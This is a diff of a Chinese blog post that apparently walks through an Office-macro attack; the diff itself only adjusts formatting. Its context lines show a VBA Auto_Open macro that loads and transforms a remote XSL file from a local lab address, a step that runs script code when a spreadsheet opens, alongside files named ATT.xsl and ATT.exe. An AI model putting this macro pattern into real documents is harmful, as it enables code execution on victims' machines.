@@ -11,11 +11,12 @@ layout: post
 
 ## 准备工作：<br>
 **1.创建以下两个文件<br>**
-<font color=Red face="黑体">
+<font color=Red>
 excel.xsl<br>
 ATT.xsl<br>
 ATT.exe<br>
 </font>
+---
 
 > excel.xsl
 
@@ -27,7 +28,7 @@ Sub Auto_Open()
     xsl.Load "http://127.0.0.1:80/ATT.xsl"
     XML.transformNode xsl
 End Sub
-```
+***
 
 > ATT.xsl
 
